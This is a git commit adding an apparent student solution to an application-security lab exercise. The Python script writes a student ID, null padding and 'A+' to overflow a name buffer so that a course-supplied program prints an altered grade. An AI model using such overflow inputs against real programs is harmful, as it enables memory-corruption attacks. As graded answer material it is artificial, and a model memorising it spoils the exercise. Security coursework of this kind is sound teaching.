deb4eb56c1504a7c96d751a559253b44cef1b8c4
aa <aa@aa.com>
2021-02-02 16:54:17 +0800

    Add 1.2.1

--- AppSec/1.2.1.py
+++ AppSec/1.2.1.py
@@ -4,4 +4,15 @@ import sys
 from shellcode import shellcode
 from struct import pack
 
+'''
+1234567890-qwertyuiopasdfghjklzxcvbnm
+->
+Hi 1234567890-qwertyuiopasdfghjklzxcvbnm! Your grade is -qwertyuiopasdfghjklzxcvbnm.
+'''
+
 # Your code here
+pad = 10
+netid = 'zhiqic2'
+sys.stdout.buffer.write((netid).encode())
+sys.stdout.buffer.write(b'\x00'*(pad-len(netid)))
+sys.stdout.buffer.write(b'A+')
